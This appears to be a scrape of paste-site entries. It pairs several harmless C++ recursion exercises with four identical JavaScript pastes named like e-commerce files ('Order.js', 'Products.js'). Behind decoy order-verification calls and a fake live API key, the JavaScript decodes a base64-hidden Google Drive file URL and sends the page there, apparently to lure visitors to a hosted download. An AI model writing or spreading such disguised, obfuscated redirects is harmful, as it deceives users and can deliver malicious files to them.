kL6PDBCg,Order.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 07:29:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/39467/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
qKjewCFA,Untitled,Josif_tepe,C++,Sunday 13th of April 2025 07:26:22 AM CDT,"#include <iostream>
#include <vector>
using namespace std;

bool rec(int number, int i) {
    if(i == number) {
        return true;
    }
    
    if(number % i == 0) {
        return false;
    }
    
    return rec(number, i + 1);
}
int main() {
    cout << rec(11, 2) << endl;
    return 0;
}


// rec(1234) = rec(123) + 4 = 6 + 4 = 10
// rec(123) = rec(12) + 3 = 3 + 3 = 6
// rec(12) = rec(1) + 2 = 1 + 2 = 3
// rec(1) = rec(0) + 1 = 0 + 1 = 1
// rec(0) = 0
"
13Jpreyk,Market.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 07:14:26 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/38117/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2Qnn0YQu,Untitled,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 06:58:47 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/88449/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
aNGQ7mcV,Untitled,Josif_tepe,C++,Sunday 13th of April 2025 06:55:51 AM CDT,"#include <iostream>
#include <vector>
using namespace std;

int rec(int number) {
    if(number == 0) {
        return 0;
    }
    int cifra = number % 10;
    return rec(number / 10) + cifra;
}
int main() {
    cout << rec(1234) << endl;
    
    return 0;
}


// rec(1234) = rec(123) + 4 = 6 + 4 = 10
// rec(123) = rec(12) + 3 = 3 + 3 = 6
// rec(12) = rec(1) + 2 = 1 + 2 = 3
// rec(1) = rec(0) + 1 = 0 + 1 = 1
// rec(0) = 0
"
vaUYx897,Products.js,Ratqueenkslskskwkw,JavaScript,Sunday 13th of April 2025 06:43:26 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65772/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eVUbjvPm,Untitled,Josif_tepe,C++,Sunday 13th of April 2025 06:42:31 AM CDT,"#include <iostream>
#include <vector>
using namespace std;

void print(int x) {
    if(x > 100) {
        return;
    }
    
    bool prost = true;
    for(int i = 2; i < x; i++) {
        if(x % i == 0) {
            prost = false;
            break;
        }
    }
    if(prost and x != 1) {
        cout << x << "" "";
    }
    print(x + 1);
}
int main() {
    print(1);
    
    return 0;
}
// print(1) --> print(2) | cout << 1;
// print(2) --> print(3) | cout << 2;
// print(3) --> print(4) | cout << 3;
// print(4) --> print(5) | cout << 4;
// print(5) --> print(6) | cout << 5;
// print(6)
"
Y77RbQh5,Untitled,Josif_tepe,C++,Sunday 13th of April 2025 06:28:53 AM CDT,"#include <iostream>
#include <vector>
using namespace std;

void print(int x) {
    if(x > 5) {
        return;
    }
    
    print(x + 1);
    cout << x << endl;
}
int main() {
    print(1);
    
    return 0;
}
// print(1) --> print(2) | cout << 1;
// print(2) --> print(3) | cout << 2;
// print(3) --> print(4) | cout << 3;
// print(4) --> print(5) | cout << 4;
// print(5) --> print(6) | cout << 5;
// print(6)
"
